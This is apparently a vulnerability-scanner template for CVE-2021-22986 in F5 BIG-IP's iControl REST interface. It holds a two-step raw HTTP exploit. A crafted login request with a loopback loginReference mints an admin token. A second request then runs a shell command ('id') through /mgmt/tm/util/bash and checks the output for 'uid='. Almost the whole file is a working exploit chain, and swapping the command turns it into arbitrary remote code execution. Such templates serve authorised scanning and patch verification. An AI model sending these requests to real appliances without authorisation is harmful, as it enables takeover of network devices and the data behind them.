id: cve-2021-22986
info:
  advisory: https://support.f5.com/csp/article/K03009991
  author: Harsh Jaiswal (@rootxharsh) & Rahul Maini (@iamnoooob)
  description: The iControl REST interface has an unauthenticated remote command execution
    vulnerability.
  name: F5 BIG-IP iControl REST unauthenticated RCE
  reference: https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986
  severity: critical
  tags: bigip,cve,cve2021,rce
requests:
- extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - ([A-Z0-9]{26})
    type: regex
  - group: 1
    part: body
    regex:
    - '"commandResult":"(.*)"'
    type: regex
  matchers:
  - condition: and
    type: word
    words:
    - commandResult
    - uid=
  raw:
  - 'POST /mgmt/shared/authn/login HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: en

    Authorization: Basic YWRtaW46

    Content-Type: application/json

    Cookie: BIGIPAuthCookie=1234

    Connection: close


    {"username":"admin","userReference":{},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}

    '
  - "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en\nX-F5-Auth-Token:\
    \ \xA7token\xA7\nContent-Type: application/json\nConnection: close\n\n{\"command\"\
    :\"run\",\"utilCmdArgs\":\"-c id\"}\n"
